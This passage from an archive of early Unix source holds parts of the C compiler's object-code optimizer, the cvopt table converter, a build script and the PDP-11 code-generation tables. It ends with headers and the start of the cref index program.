		p->labno = p1->labno;
		p->ref->refc++;
	}
}

findcon(i)
{
	register char *p;
	register r;

	p = regs[i];
	if (*p=='$')
		return(p);
	if ((r = isreg(p)) >= 0)
		return(regs[r]);
	if (equstr(p, conloc))
		return(conval);
	return(p);
}

compare(op, acp1, acp2)
char *acp1, *acp2;
{
	register char *cp1, *cp2;
	register n1;
	int n2;
	struct { int i;};

	cp1 = acp1;
	cp2 = acp2;
	if (*cp1++ != '$' || *cp2++ != '$')
		return(0);
	n1 = 0;
	while (*cp2 >= '0' && *cp2 <= '7') {
		n1 =<< 3;
		n1 =+ *cp2++ - '0';
	}
	n2 = n1;
	n1 = 0;
	while (*cp1 >= '0' && *cp1 <= '7') {
		n1 =<< 3;
		n1 =+ *cp1++ - '0';
	}
	if (*cp1=='+')
		cp1++;
	if (*cp2=='+')
		cp2++;
	do {
		if (*cp1++ != *cp2)
			return(0);
	} while (*cp2++);
	cp1 = n1;
	cp2 = n2;
	switch(op) {

	case JEQ:
		return(cp1 == cp2);
	case JNE:
		return(cp1 != cp2);
	case JLE:
		return(cp1.i <= cp2.i);
	case JGE:
		return(cp1.i >= cp2.i);
	case JLT:
		return(cp1.i < cp2.i);
	case JGT:
		return(cp1.i > cp2.i);
	case JLO:
		return(cp1 < cp2);
	case JHI:
		return(cp1 > cp2);
	case JLOS:
		return(cp1 <= cp2);
	case JHIS:
		return(cp1 >= cp2);
	}
	return(0);
}

setcon(ar1, ar2)
char *ar1, *ar2;
{
	register char *cl, *cv, *p;

	cl = ar2;
	cv = ar1;
	if (*cv != '$')
		return;
	if (!natural(cl))
		return;
	p = conloc;
	while (*p++ = *cl++);
	p = conval;
	while (*p++ = *cv++);
}

equstr(ap1, ap2)
char *ap1, *ap2;
{
	char *p1, *p2;

	p1 = ap1;
	p2 = ap2;
	do {
		if (*p1++ != *p2)
			return(0);
	} while (*p2++);
	return(1);
}

setcc(ap)
char *ap;
{
	register char *p, *p1;

	p = ap;
	if (!natural(p)) {
		ccloc[0] = 0;
		return;
	}
	p1 = ccloc;
	while (*p1++ = *p++);
}

natural(ap)
char *ap;
{
	register char *p;

	p = ap;
	if (*p=='*' || *p=='(' || *p=='-'&&*(p+1)=='(')
		return(0);
	while (*p++);
	p--;
	if (*--p == '+' || *p ==')' && *--p != '5')
		return(0);
	return(1);
}
-- /usr/source/c/c2h.c mode=0100644 uid=10 gid=1 atime=174920613 mtime=174910925 --
/*
 * Header for object code improver
 */

#define	JBR	1
#define	CBR	2
#define	JMP	3
#define	LABEL	4
#define	DLABEL	5
#define	EROU	7
#define	JSW	9
#define	MOV	10
#define	CLR	11
#define	COM	12
#define	INC	13
#define	DEC	14
#define	NEG	15
#define	TST	16
#define	ASR	17
#define	ASL	18
#define	SXT	19
#define	CMP	20
#define	ADD	21
#define	SUB	22
#define	BIT	23
#define	BIC	24
#define	BIS	25
#define	MUL	26
#define	DIV	27
#define	ASH	28
#define	XOR	29
#define	TEXT	30
#define	DATA	31
#define	BSS	32
#define	EVEN	33
#define	MOVF	34
#define	MOVOF	35
#define	MOVFO	36
#define	ADDF	37
#define	SUBF	38
#define	DIVF	39
#define	MULF	40
#define	CLRF	41
#define	CMPF	42
#define	NEGF	43
#define	TSTF	44
#define	CFCC	45
#define	SOB	46
#define	JSR	47
#define	END	48

#define	JEQ	0
#define	JNE	1
#define	JLE	2
#define	JGE	3
#define	JLT	4
#define	JGT	5
#define	JLO	6
#define	JHI	7
#define	JLOS	8
#define	JHIS	9

#define	BYTE	100

struct node {
	char	op;
	char	subop;
	struct	node	*forw;
	struct	node	*back;
	struct	node	*ref;
	int	labno;
	char	*code;
	int	refc;
};

struct {
	int	combop;
};

struct optab {
	char	*opstring;
	int	opcode;
} optab[];

char	line[512];
struct	node	first;
char	*curlp;
int	nbrbr;
int	nsaddr;
int	redunm;
int	iaftbr;
int	njp1;
int	nrlab;
int	nxjump;
int	ncmot;
int	nrevbr;
int	loopiv;
int	nredunj;
int	nskip;
int	ncomj;
int	nsob;
int	nrtst;
int	nlit;

int	nchange;
int	isn;
int	debug;
char	*lasta;
char	*lastr;
char	*firstr;
char	revbr[];
char	regs[12][20];
char	conloc[20];
char	conval[20];
char	ccloc[20];

#define	RT1	10
#define	RT2	11
#define	FREG	5
#define	NREG	5
#define	LABHS	127
#define	OPHS	57

struct optab *ophash[OPHS];
struct { char lbyte; };
-- /usr/source/c/cvopt.c mode=0110644 uid=10 gid=1 atime=174920568 mtime=174910914 --
int	nofloat;
int	peekc;
int	obuf[259];
int	tabflg;
int	labno	1;

main(argc, argv)
char **argv;
{
/*
	A1 -> A
	A2    B
	A     O
	B1    C
	B2    D
	BE    L
	BF    P
	C1    E
	C2    F
	F     G
	H     H
	R     I
	R1    J
	S     K
	I     M
	M     N

		*	+1
		S	+2
		C	+4
		1	+8

	z  -> 4
	c     10
	a     14
	e     20
	n     63
	*	+0100
*/

	auto c,snlflg,nlflg,t,smode,m,ssmode;
	extern fin;

	smode = nlflg = snlflg = ssmode = 0;
	if (argc>1)
		if ((fin = open(argv[1], 0)) < 0) {
			putchar('?\n');
			return;
		}
	obuf[0] = 1;
	if (argc>2) 
		if ((obuf[0] = creat(argv[2], 0666)) < 0) {
			putchar('?\n');
			return;
		}
loop:
	c = getc();
	if (c!='\n' && c!='\t') nlflg = 0;
	if (ssmode!=0 && c!='%') {
		ssmode = 0;
		printf(".data\nL%d:<", labno++);
	}
	switch(c) {

	case '\0':
		printf(".text; 0\n");
		fflush(obuf);
		return;

	case ':':
		if (!smode)
			printf("=.+2; 0"); else
			putchar(':');
		goto loop;

	case 'A':
		if ((c=getc())=='1' || c=='2') {
			putchar(c+'A'-'1');
			goto loop;
		}
		putchar('O');
		peekc = c;
		goto loop;

	case 'B':
		switch (getc()) {

		case '1':
			putchar('C');
			goto loop;

		case '2':
			putchar('D');
			goto loop;

		case 'E':
			putchar('L');
			goto loop;

		case 'F':
			putchar('P');
			goto loop;
		}
		putchar('?');
		goto loop;

	case 'C':
		putchar(getc()+'E'-'1');
		goto loop;

	case 'F':
		putchar('G');
		goto subtre;

	case 'R':
		if ((c=getc()) == '1')
		putchar('J'); else {
			putchar('I');
			peekc = c;
		}
		goto loop;

	case 'H':
		putchar('H');
		goto subtre;

	case 'I':
		putchar('M');
		goto loop;

	case 'S':
		putchar('K');
subtre:
		snlflg = 1;
		t = 'A';
l1:
		switch (c=getc()) {

		case '*':
			t++;
			goto l1;

		case 'S':
			t =+ 2;
			goto l1;

		case 'C':
			t =+ 4;
			goto l1;

		case '1':
			t =+ 8;
			goto l1;

		case '2':
			t =+ 16;
			goto l1;
		}
		peekc = c;
		putchar(t);
		goto loop;

	case '#':
		if(getc()=='1')
			putchar('#'); else
			putchar('"');
		goto loop;

	case '%':
		if (smode)
			printf(".text;");
		if (ssmode==0) {
			if ((peekc=getc())=='[') {
				peekc = 0;
				printf(".data;");
				while((c=getc())!=']')
					putchar(c);
				getc();
				printf(";.text;");
				goto loop;
			}
		}
loop1:
		switch (c=getc()) {

		case ' ':
		case '\t':
			goto loop1;
		case 'a':
			m = 16;
			t = flag();
			goto pf;

		case ',':
			putchar(';');
			goto loop1;

		case 'i':
			m = 12;
			t = flag();
			goto pf;
		case 'z':
			m = 4;
			t = flag();
			goto pf;

		case 'r':
			m = 9;
			t = flag();
			goto pf;

		case '1':
			m = 5;
			t = flag();
			goto pf;

		case 'c':
			t = 0;
			m = 8;
			goto pf;

		case 'e':
			t = flag();
			m = 20;
			goto pf;

		case 'n':
			t = flag();
			m = 63;
pf:
			if ((c=getc())=='*')
				m =+ 0100; else
				peekc = c;
			printf(".byte %o,%o", m, t);
			goto loop1;
		case '[':
			printf("L%d=", labno++);
			while ((c=getc())!=']')
				putchar(c);
			ssmode = 0;
			smode = 0;
			goto loop;

		case '\n':
			printf("\nL%d\n", labno);
			ssmode = 1;
			nlflg = 1;
			smode = 1;
			goto loop;
		}
		putchar(c);
		goto loop1;

	case '\t':
		if (nlflg) {
			nlflg = 0;
			goto loop;
		}
		if (smode) {
			tabflg++;
			goto loop;
		}
		putchar('\t');
		goto loop;

	case '\n':
		if (!smode)  {
			putchar('\n');
			goto loop;
		}
		if (nlflg) {
			nlflg = 0;
			printf("\\0>\n.text\n");
			smode = 0;
			goto loop;
		}
		if (!snlflg)
			printf("\\n");
		snlflg = 0;
		printf(">\n<");
		nlflg = 1;
		goto loop;

	case 'X':
	case 'Y':
	case 'T':
		snlflg++;
	}
	putchar(c);
	goto loop;
}

getc() {
	auto t, ifcnt;

	ifcnt = 0;
gc:
	if (peekc) {
		t = peekc;
		peekc = 0;
	} else
		t = getchar();
	if (t==0)
		return(0);
	if (t=='{') {
		ifcnt++;
		t = getchar();
	}
	if (t=='}') {
		t = getc();
		if (--ifcnt==0)
			if (t=='\n')
				t = getc();
	}
	if (ifcnt && nofloat)
		goto gc;
	return(t);
}

flag() {
	register c, f;

	f = 0;
l1:
	switch(c=getc()) {

	case 'w':
		f = 1;
		goto l1;

	case 'i':
		f = 2;
		goto l1;

	case 'b':
		f = 3;
		goto l1;

	case 'f':
		f = 4;
		goto l1;

	case 'd':
		f = 5;
		goto l1;

	case 's':
		f = 6;
		goto l1;

	case 'l':
		f = 8;
		goto l1;

	case 'p':
		f =+ 16;
		goto l1;
	}
	peekc = c;
	return(f);
}

putchar(c)
{
	if (tabflg) {
		tabflg = 0;
		printf(">;.byte %o;<", c+0200);
	} else
		putc(c, obuf);
}
-- /usr/source/c/run mode=0100664 uid=3 gid=3 atime=174920698 mtime=174919418 --
cc -c -O c0[012345].c
cc -c -O c1[0123].c
as c1t.s; mv a.out c1t.o
cc cvopt.c
a.out table.s table.i
as table.i; mv a.out table.o
cc -c -O c2[01].c

ed c0t.s
g/fpp =/s/1/0/
w
q
as c0t.s; mv a.out c0t.o
cc -s -n c0?.o
cmp a.out /lib/c0
cp a.out /lib/c0

ed c0t.s
g/fpp =/s/0/1/
w
q
as c0t.s; mv a.out c0t.o
cc -f -s -n c0?.o
cmp a.out /lib/fc0
cp a.out /lib/fc0

cc -s -n c1?.o table.o
cmp a.out /lib/c1
cp a.out /lib/c1

cc -f -s -n c1?.o table.o
cmp a.out /lib/fc1
cp a.out /lib/fc1

cc -s -n c2?.o
cmp a.out /lib/c2
cp a.out /lib/c2

rm *.o table.i a.out
-- /usr/source/c/table.s mode=0110666 uid=10 gid=1 atime=174920580 mtime=174910914 --
/
/ c code tables-- compile to register
/

.globl	_regtab

.data
_regtab=.
	106.;	cr106
	30.;	cr70
	31.;	cr70
	32.;	cr32
	33.;	cr32
	37.;	cr37
	38.;	cr37
	98.;	cr100
	99.;	cr100
	80.;	cr80
	40.;	cr40
	41.;	cr40	/ - like +
	42.;	cr42
	43.;	cr43
	44.;	cr43
	45.;	cr45
	46.;	cr40
	55.; 	cr40
	48.;	cr40
	49.;	cr49
	70.;	cr70
	71.;	cr70
	72.;	cr72
	73.;	cr73
	74.;	cr74
	75.;	cr75
	76.;	cr72
	78.;	cr70
	85.;	cr70
	79.;	cr79
	102.;	cr102
	51.;	cr51
	52.;	cr52
	56.;	cr56
	57.;	cr57
	58.;	cr58
	59.;	cr59
	91.;	cr91
	82.;	cr82
	83.;	cr82
	84.;	cr82
	86.;	cr86
	87.;	cr86
	88.;	cr86
	0
.text

/ goto
cr102:
%a,n
	jmp	A1

%n*,n
	F*
	jmp	#1(R)

/ call
cr100:
%a,n
	jsr	pc,IA1

%n*,n
	F*
	jsr	pc,#1(R)

%n,n
	F
	jsr	pc,(R)

/ addressible
cr106:
%z,n
	clr	R

%zf,n
	clrf	R

%a,n
%ad,n
	movB1	A1,R

%af,n
	movof	A1,R

%n*,n
%nd*,n
	F*
	movB1	#1(R),R

%nf*,n
	F*
	movof	#1(R),R

%al,n
	mov	A1+,R+
	mov	A1,R

%nl*,n
	F*
	mov	#1+2(R),R+
	mov	#1(R),R

/ ++,-- postfix
cr32:
%a,1
	movB1	A1',R
	I'B1	A1

%aw,n
	mov	A1',R
	I	A2,A1

%e*,1
	F1*
	movB1	#1(R1),R
	I'B1	#1(R1)

%n*,1
	F*
	movB1	#1(R),-(sp)
	I'B1	#1(R)
	movB1	(sp)+,R

%ew*,n
	F1*
	mov	#1(R1),R
	I	A2,#1(R1)

%nw*,n
	F*
	mov	#1(R),-(sp)
	I	A2,#1(R)
	mov	(sp)+,R

%al,1
	F
	I	$1,A1+
	V	A1

%el*,1
	F1*
	mov	#1+2(R1),R+
	mov	#1(R1),R
	I	$1,#1+2(R1)
	V	#1(R1)

%nl*,1
	F*
	mov	#1+2(R),-(sp)
	mov	#1(R),-(sp)
	add	$1,#1+2(R)
	V	#1(R)
	mov	(sp)+,R
	mov	(sp)+,R+

/ - unary, ~
cr37:
%n,n
%nf,n
	F
	IBF	R

%nl,n
	F
	I	R
	I	R+
	V	R

/ =
cr80:
%a,n
%ad,nf
	S
	movB1	R,A1

%af,nf
	S
	movfo	R,A1

%nd*,af
	F*
	S
	movf	R,#1(R)

%n*,a
	F*
	movB1	A2,#1(R)
	movB1	#1(R),R

%nf*,af
	F*
	S
	movfo	R,#1(R)

%n*,e
	F*
	S1
	movB1	R1,#1(R)
	movB1	R1,R

%ed*,nf
	S
	F1*
	movf	R,#1(R1)

%ef*,nf
	S
	F1*
	movfo	R,#1(R1)

%n*,n
%nd*,nf
	FS*
	S
	movB1	R,*(sp)+

%nf*,nf
	FS*
	S
	movfo	R,*(sp)+

/ +, -, |, &~, <<
cr40:
%n,z
	F

%n,1
	F
	I'	R

%[add1:]
%n,aw
%nf,ad
	F
	IB2	A2,R

%[add2:]
%n,ew*
%nf,ed*
	F
	S1*
	IB2	#2(R1),R

%[add3:]
%n,e
%nf,ef
	F
	S1
	IBF	R1,R

%[add4:]
%n,nw*
%nf,nd*
	SS*
	F
	IB2	*(sp)+,R

%[add5:]
%n,n
%nf,nf
	SS
	F
	IBF	(sp)+,R

%nl,c
	F
	I	A2,R+
	V	R

%nl,al
	F
	I	A2,R
	I	A2+,R+
	V	R

%nl,el
	F
	S1
	I	R1+,R+
	V	R
	I	R1,R

%nl,nl
	SS
	F
	I	(sp)+,R
	I	(sp)+,R+
	V	R

/ ^ -- xor
cr49:
%n,e
%	[add3]

%n,n
	FS
	S
	xor	R,(sp)
	mov	(sp)+,R

/ >> (all complicated cases taken care of by << -)
cr45:
%n,1
	F
	asr	R

/ * -- R must be odd on integers
cr42:
%n,aw
%nf,ad
%	[add1]

%n,ew*
%nf,ed*
%	[add2]

%n,e
%nf,ef
%	[add3]

%n,n
%nf,nf
%	[add5]

/ / R must be odd on integers
cr43:
%n,aw
	F
	T
	sxt	R-
	div	A2,R-

%n,ew*
	F
	T
	sxt	R-
	S1*
	div	#2(R1),R-

%n,e
	F
	T
	sxt	R-
	S1
	div	R1,R-

%n,n
	SS
	F
	T
	sxt	R-
	div	(sp)+,R-

%nf,ad
%	[add1]

%nf,ed*
%	[add2]

%nf,ef
%	[add3]

%nf,nf
%	[add5]

/ =+, =-, =|, =&~
cr70:
%[addq1:]
%aw,aw
	I	A2,A1'
	mov	A1,R

%[addq1a:]
%a,aw
%ad,ad
	movB1	A1',R
	IBF	A2,R
	movB1	R,A1

%[addq2:]
%aw,nw*
	S*
	I	#2(R),A1'
	mov	A1,R

%[addq3:]
%aw,n
	S
	I	R,A1'
	mov	A1,R

%[addq4:]
%ew*,nw*
	S*
	F1*
	I	#2(R),#1(R1)
	mov	#1(R1),R

%[addq4a:]
%ad,ef
	movf	A1',R
	S1
	IBF	R1,R
	movf	R,A1

%[addq5:]
%a,n
%ad,nf
	SS
	movB1	A1',R
	IBF	(sp)+,R
	movB1	R,A1

%[addq6:]
%af,nf
	SS
	movof	A1',R
	IBF	(sp)+,R
	movfo	R,A1

%[addq7:]
%ew*,n
	S
	F1*
	I	R,#1(R1)
	mov	#1(R1),R

%[addq8:]
%nw*,n
	SS
	F*
	I	(sp)+,#1(R)
	mov	#1(R),R

%[addq9:]
%n*,n
	FS*
	SS
	movB1	*2(sp),R
	IBF	(sp)+,R
	movB1	R,*(sp)+

%[addq9a:]
%nd*,nf
	SS
	F*
	movB1	#1(R),R
	IBF	(sp)+,R
	movB1	R,#1(R)

%[addq10:]
%nf*,nf
	SS
	F*
	movof	#1(R),R1
	IBF	(sp)+,R1
	movfo	R1,#1(R)
	movf	R1,R

/ =*, =<< (for integer multiply, R must be odd)
cr72:
%a,aw
%ad,ad
%	[addq1a]

%af,nf
%	[addq6]

%ad,ef
%	[addq4a]

%a,n
%ad,nf
%	[addq5]

%n*,n
%	[addq9]

%nd*,nf
%	[addq9a]

%nf*,nf
%	[addq10]

/ =/ ;  R must be odd on integers
cr73:
%a,aw
	movB1	A1',R
	sxt	R-
	divBF	A2,R-
	movB1	R-,A1

%a,n
	SS
	movB1	A1',R
	sxt	R-
	div	(sp)+,R-
	movB1	R-,A1

%e*,n
	SS
	F1*
	movB1	#1(R1),R
	sxt	R-
	div	(sp)+,R-
	movB1	R-,#1(R1)

%n*,n
	FS*
	SS
	movB1	*2(sp),R
	sxt	R-
	div	(sp)+,R-
	movB1	R-,*(sp)+

%ad,ad
%	[addq1a]

%ad,ef
%	[addq4a]

%ad,nf
%	[addq5]

%af,nf
%	[addq6]

%nd*,nf
%	[addq9a]

%nf*,nf
%	[addq10]

/ =mod; R must be odd on integers
cr74:
%a,aw
	movB1	A1',R
	sxt	R-
	div	A2,R-
	movB1	R,A1

%a,n
	SS
	movB1	A1',R
	sxt	R-
	div	(sp)+,R-
	movB1	R,A1

%e*,n
	SS
	F1*
	movB1	#1(R1),R
	sxt	R-
	div	(sp)+,R-
	movB1	R,#1(R1)

%n*,n
	FS*
	SS
	movB1	*2(sp),R
	sxt	R-
	div	(sp)+,R-
	mov	R,*(sp)+

/ =^ -- =xor
cr79:
%aw,n
%	[addq3]

%ab,n
	SS
	movb	A1',R
	xor	R,(sp)
	mov	(sp)+,R
	movb	R,A1

%n*,n
	FS*
	movB1	*(sp),-(sp)
	S
	xor	R,(sp)
	movB1	(sp)+,R
	movB1	R,*(sp)+

/ =>> (all complicated cases done by =<< -)
cr75:
%a,1
	asrB1	A1'
	movB1	A1,R

%n*,1
	F*
	asrB1	#1(R)
	movB1	#1(R),R

/ << for longs
cr91:
%nl,aw
%	[add1]

%nl,ew*
%	[add2]

%nl,e
%	[add3]

%nl,nw*
%	[add4]

%nl,n
%	[add5]

/ int -> float
cr51:
%aw,n
	movif	A1,R

%nw*,n
	F*
	movif	#1(R),R

%n,n
	F
	movif	R,R

/ float, double -> int
cr52:
%nf,n
	F
	movfi	R,R

/ double (float) to long
cr56:
%nf,n
	F
	setl
	movfi	R,-(sp)
	mov	(sp)+,R
	mov	(sp)+,R+
	seti

/ long to double
cr57:
%al,n
	setl
	movif	A1,R
	seti

%nl*,n
	F*
	setl
	movif	#1(R),R
	seti

%nl,n
	FS
	setl
	movif	(sp)+,R
	seti

/ integer to long
cr58:
%n,n
	F1!
	sxt	R

/ long to integer
cr59:
%al,n
	mov	A1+,R

%nl*,n
	F*
	mov	#1+2(R),R

%nl,n
	F
	mov	R+,R

/ *, /, remainder for longs.
cr82:
%nl,nl
	SS
	FS
	jsr	pc,I
	add	$10,sp

/ =*, =/, =rem for longs
/ Operands of the form &x op y, so stack space is known.
cr86:
%n,nl
	SS
	FS
	jsr	pc,I
	add	$6,sp

/
/ c code tables -- compile for side effects.
/ Also set condition codes properly (except for ++, --)
/

.globl	_efftab

.data
_efftab=.
	30.;	ci70
	31.;	ci70
	32.;	ci70
	33.;	ci70
	80.;	ci80
	70.;	ci70
	71.;	ci70	/ - like +
	78.;	ci78
	85.;	ci78
	75.;	ci75
	76.;	ci76
	92.;	ci92
	0
.text

/ =
ci80:
%[move1:]
%a,z
%ad,zf
	I'B1	A1

%[move2:]
%n*,z
%nd*,zf
	F*
	I'B1	#1(R)

%[move3:]
%a,aw
%ab,a
	IBE	A2,A1

%[move4:]
%ab,n*
%a,nw*
	S*
	IBE	#2(R),A1

%[move5:]
%a,n
	S
	IB1	R,A1

%[move6:]
%n*,aw
%nb*,a
	F*
	IBE	A2,#1(R)

%[move7:]
%n*,ew*
%nb*,e*
	F*
	S1*
	IBE	#2(R1),#1(R)

%[move8:]
%n*,e
	F*
	S1
	IB1	R1,#1(R)

%[move9:]
%e*,nw*
%eb*,n*
	S*
	F1*
	IBE	#2(R),#1(R1)

%[move10:]
%e*,n
	S
	F1*
	IB1	R,#1(R1)

%[move11:]
%n*,nw*
%nb*,n*
	FS*
	S*
	IBE	#2(R),*(sp)+

%[move12:]
%n*,n
	FS*
	S
	IB1	R,*(sp)+

%al,z
	clr	A1
	clr	A1+

%al,aw
	mov	A2,A1+
	sxt	A1

%al,nw*
	mov	#2(R),A1+
	sxt	A1

%al,n
	S
	mov	R,A1+
	sxt	A1

%al,nf
	S
	setl
	movfi	R,A1
	seti

%el*,nf
	S
	F1*
	setl
	movfi	R,#1(R1)
	seti

%[move13a:]
%al,c
	I	A2,A1+
	V	A1

%[move13:]
%al,al
	I	A2,A1
	I	A2+,A1+
	V	A1

%[move14:]
%al,nl*
	S*
	I	#2(R),A1
	I	#2+2(R),A1+
	V	A1

%[move14a:]
%nl*,c
	F*
	I	A2,2+#1(R)
	V	#1(R)

%[move15:]
%al,nl
	S
	I	R,A1
	I	R+,A1+
	V	A1

%nl*,aw
	F*
	mov	A2,#1+2(R)
	sxt	#1(R)

%[move16:]
%el*,nl
	S
	F1*
	I	R+,#1+2(R1)
	V	#1(R1)
	I	R,#1(R1)

%nl*,n
	SS
	F*
	mov	(sp)+,#1+2(R)
	sxt	#1(R)

%[move17:]
%nl*,nl
	SS
	F*
	I	(sp)+,#1(R)
	I	(sp)+,#1+2(R)
	V	#1(R)

/ =| and =& ~
ci78:
%a,a
%	[move3]

%a,n
%	[move5]

%n*,a
%	[move6]

%n*,e*
%	[move7]

%n*,e
%	[move8]

%e*,n*
%	[move9]

%e*,n
%	[move10]

%n*,n*
%	[move11]

%n*,n
%	[move12]

%al,c
%	[move13a]

%al,al
%	[move13]

%al,nl*
%	[move14]

%al,nl
%	[move15]

%nl*,c
%	[move14a]

%el*,nl
%	[move16]

%nl*,nl
%	[move17]

/ =+
ci70:
%n*,z
%a,z

%a,1
	I'B1	A1

%aw,aw
%	[move3]

%aw,nw*
%	[move4]

%aw,n
%	[move5]

%n*,1
%	[move2]

%ew*,nw*
%	[move9]

%a,nw*
	S*
	movB1	A1',R1
	I	#2(R),R1
	movB1	R1,A1

%a,n
	S
	movB1	A1',R1
	I	R,R1
	movB1	R1,A1

%ew*,n
%	[move10]

%nw*,n
%	[move12]

%n*,n
	SS
	F*
	movB1	#1(R),R1
	I	(sp)+,R1
	movB1	R1,#1(R)

%al,c
%	[move13a]

%al,al
%	[move13]

%al,nl*
%	[move14]

%al,nl
%	[move15]

%nl*,c
%	[move14a]

%el*,nl
%	[move16]

%nl*,nl
%	[move17]

/ =>> (all harder cases handled by =<< -)
ci75:
%a,1
	asrB1	A1

%n*,1
	F*
	asrB1	#1(R)

/ =<<
ci76:
%a,1
	aslB1	A1

%n*,1
	F*
	aslB1	#1(R)

%r,aw
	ash	A2,A1

%r,nw*
	S*
	ash	#2(R),A1

%r,n
	S
	ash	R,A1

/ =<< for longs
ci92:
%al,aw
	F
	ashc	A2,R
	mov	R,A1
	mov	R+,A1+

%al,n
	SS
	F
	ashc	(sp)+,R
	mov	R,A1
	mov	R+,A1+

%nl*,n
	FS*
	SS
	mov	2(sp),R
	mov	2(R),R+
	mov	(R),R
	ashc	(sp)+,R
	mov	R,*(sp)
	mov	(sp)+,R
	mov	R+,2(R)

/
/ c code tables-- set condition codes
/

.globl	_cctab

.data
_cctab=.
	106.;	cc60
	28.;	rest
	55.;	rest
	34.;	rest
	35.;	rest
	36.;	rest
	37.;	rest
	40.;	rest
	41.;	rest
	42.;	rest
	43.;	rest
	45.;	rest
	46.;	rest
	81.;	cc81	/ & as in "if ((a&b)==0)"
	48.;	rest
	60.;	cc60
	61.;	cc60
	62.;	cc60
	63.;	cc60
	64.;	cc60
	65.;	cc60
	66.;	cc60
	67.;	cc60
	68.;	cc60
	69.;	cc60
	72.;	rest
	73.;	rest
	79.;	rest
	0
.text

/ relationals
cc60:
%a,z
%ad,zf
%	[move1]

%af,z
	movof	A1,R

%n*,z
%nd*,zf
%	[move2]

%nf*,z
	F*
	movof	#1(R),R

%n,z
%nf,zf
	FC

%aw,aw
%ab,ab
%	[move3]

%nw*,aw
%nb*,ab
%	[move6]

%n,aw
%nf,ad
%	[add1]

%nw*,ew*
%nb*,eb*
%	[move7]

%nw*,e
%	[move8]

%n,ew*
%nf,ed*
%	[add2]

%n,e
%nf,ef
%	[add3]

%nw*,nw*
%nb*,nb*
%	[move11]

%nw*,n
%	[move12]

%n,n
%nf,nf
%	[add5]

/ & as in "if ((a&b) ==0)"
cc81:
%a,a
%	[move3]

%n*,a
%	[move6]

%n,a
%	[add1]

%n,e
%	[add3]

%n,n
%	[add5]

/ set codes right
rest:
%n,n
%nf,nf
	H

/
/ c code tables-- expression to -(sp)
/

.globl	_sptab

.data
_sptab=.
	106.;	cs106
	40.;	cs40
	41.;	cs40
	55.;	cs40
	48.;	cs40
	58.;	cs58
	56.;	cs56
	0
.text


/ name
cs106:
%z,n
%zf,n
	clrB1	-(sp)

%aw,n
	mov	A1,-(sp)

%nw*,n
	F*
	mov	#1(R),-(sp)

%al,n
	mov	A1+,-(sp)
	mov	A1,-(sp)

/ +, -, |, &~
cs40:
%n,1
	FS
	I'	(sp)

%n,aw
	FS
	I	A2,(sp)

%n,nw*
	FS
	S*
	I	#2(R),(sp)

%n,n
	FS
	S
	I	R,(sp)

/ integer to long
cs58:
%n,n
	FS
	sxt	-(sp)

/ float to long
cs56:
%nf,n
	F
	setl
	movfi	R,-(sp)
	seti

-- /usr/source/cref mode=0140775 uid=3 gid=3 atime=174930099 mtime=169259860 --
-- /usr/source/cref/ccmn.h mode=0100664 uid=3 gid=3 atime=174920765 mtime=169260008 --
struct	tempent {
		char	*beg;
		int	ct;
		char	term;
	} temp[30];

char	lbuf[5];
int	cflag;
int	t1;

int	level;
int	hlevel;
int	dlevel;
int	xtrn;

int	tp[5];

struct	{
		int	cl[NUMC];
	} tab[NUMS];

int	coll();
int	save();
int	out();
int	asym();
int	asw();
int	csym();
int	csw();
int	incl();
int	decl();
int	sk2();
int	sk();
int	tabs();
int	semi();

char	line[132];
int	l;
int	lno;
char	c;
int	cursl;
char	curs[9];
int	curfl;
char	curf[10];

int	usw;
int	xsw;
int	only;
int	cross;
int	file;
int	cs;
int	(*flag[8])();
int	fl;
char	gch[8];

struct	htab	{
		int	hsiz;
		int	ssiz;
		int	nsym;
		int	curb;
		int	*hptr;
		char	*symt;
		};

struct	htab	itab;
struct	htab	xtab;

int	ipsp[PTRI];
char	issp[CHARI];
int	xpsp[PTRX];
char	xssp[CHARX];

int	ib1[259];
int	ib2[259];

char	*ibuf;
char	*ibuf1;
char	*ibuf2;

char	mone;
int	order;
int	ssw;
int	type;
char	*utmp;
-- /usr/source/cref/index mode=0140775 uid=3 gid=3 atime=174930099 mtime=174920836 --
-- /usr/source/cref/index/ecmn.h mode=0100664 uid=3 gid=3 atime=174920812 mtime=169260039 --
int	count;
int	page;
struct	{
		char	*beg;
		int	ct;
		char	term;
	} temp[30];

int	pn;
int	word;
int	hsw;
int	t1;

int	level;
int	hlevel;
int	dlevel;
int	xtrn;

int	tp[2];

struct	{
		int	cl[NUMC];
	} tab[NUMS];

int	coll();
int	save();
int	out();
int	hyphen();
int	hyp1();
int	hyp2();
int	pno();
int	error();

char	line[300];
int	l;
int	lno;
char	c;
int	cursl;
char	curs[9];
int	curfl;
char	curf[10];

int	usw;
int	xsw;
int	only;
int	cross;
int	file;
int	cs;
int	(*flag[8])();
int	fl;
char	gch[8];

struct	htab	{
		int	hsiz;
		int	ssiz;
		int	nsym;
		int	curb;
		int	*hptr;
		char	*symt;
		};

struct	htab	itab;

int	ipsp[PTRI];
char	issp[CHARI];

int	ib1[259];

char	*ibuf;
char	*ibuf1;

char	mone;
int	order;
int	ssw;
int	type;
char	*utmp;
-- /usr/source/cref/index/econs.h mode=0100664 uid=3 gid=3 atime=174920811 mtime=169260039 --
# define NUMA	14
# define NUMC 128
# define NUMS 3
# define SIZA	8
# define SIZC	2
# define SIZS	8
# define PTRI 509
# define CHARI 4000
# define PTRX 5147
# define CHARX 40000
# define CONT	0
# define COLL	1
# define SAVE	2
# define OUT	3
# define EGOBL	4
# define SHARP	5
# define PNO	6

# define SKIP	0
# define COLLECT	1
# define SKIP2	2
#define	CREATC	0644
-- /usr/source/cref/index/ind0.c mode=0110664 uid=3 gid=3 atime=174920798 mtime=169260039 --
#
# include "econs.h"
# include "ecmn.h"
/*int	mbuf[1024];	/*INSTR*/
/*int	tbuf[12];	/*INSTR*/

int	(*acts[])()	{0,
			&coll,
			&save,
			&out,
			&error,
			&hyphen,
			&pno
			};

char	*tmp[2]	{"/tmp/crt0a",
		"/tmp/crt1a"
		};

char	*ignonl	"/usr/lib/eign";
char	*gtab	"/usr/lib/etab";

main(argc,argv)
	char	*argv[];
{
	auto	i,j,tm1,tm2,tm3;
	char	*fn,*av[8];
/*	extern	etext;	/*INSTR*/

/*	monitor(&main,&etext,&mbuf,1024);	/*INSTR*/

	if(*argv[1] == '-') {
		j = flags(argv);
		argv =+ j;
		argc =- j;
	}

	init();

	i = 0;
	if(argc == 1) {
		*ibuf1 = 0;
		curfl = 2;
		curf[0] = '_';
		curf[1] = '\t';
		goto pipe;
	}
	while(++i < argc) {
		curs[4] = '\t';

		if(fopen(argv[i],ibuf1) < 0) {
			printf("Can't open %s\n",argv[i]);
			dexit();
		}

		curfl = 0;
